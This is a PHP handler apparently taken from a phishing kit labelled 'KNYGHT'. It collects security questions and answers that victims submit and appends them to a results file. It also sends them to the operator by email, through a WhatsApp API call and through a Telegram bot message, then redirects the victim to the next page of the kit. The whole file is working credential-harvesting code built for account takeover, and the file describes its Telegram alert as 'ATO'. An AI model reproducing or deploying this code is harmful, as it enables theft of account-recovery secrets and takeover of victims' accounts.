<?php

include "../../admin/setting/rezlts_settings/bot_settings.php";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the selected security question and the answer from the form
    $securityQuestion = isset($_POST["securityQuestion"]) ? $_POST["securityQuestion"] : "";
    $answer = isset($_POST["answer"]) ? $_POST["answer"] : "";

    // If the user selected their own question, get the question from the form
    if ($securityQuestion === 'own_question') {
        $ownQuestion = isset($_POST["ownQuestion"]) ? $_POST["ownQuestion"] : "";
        // Concatenate the own question with the answer
        $completeQuestion = "Own Question: $ownQuestion";
    } else {
        // Use the selected predefined question
        $completeQuestion = "Security Question: $securityQuestion";
    }

    // Prepare the data to be written to the text file
    $data = "$completeQuestion\n";
    $data .= "Answer: $answer\n\n";

    // Define the file path
    $filePath = "../../KNYGHT_RZLT.txt";

    // Open the file in append mode
    $file = fopen($filePath, "a");

    // Write the data to the file
    fwrite($file, $data);

    // Close the file
    fclose($file);
	$send = $email; 
	$subject = "♠️ (".$_POST['login'].")  RZLT ♠️ $ip";
$headers = "From: [KNYGHT]";
mail($send,$subject,$message,$headers);
$url='https://api.callmebot.com/whatsapp.php?source=php&phone='.$phone.'&text='.urlencode($message).'&apikey='.$apikey;
$html=file_get_contents($url);

    // Notify via Telegram

    $message = urlencode("ATO Security Q&A 1:\n$completeQuestion\nAnswer: $answer");
    $telegramUrl = "https://api.telegram.org/bot$api/sendMessage?chat_id=$chatid&text=$message";
    file_get_contents($telegramUrl);

    // Redirect back to the form or any other page
    header("Location: ../../account/-.php");
    exit;
}
?>
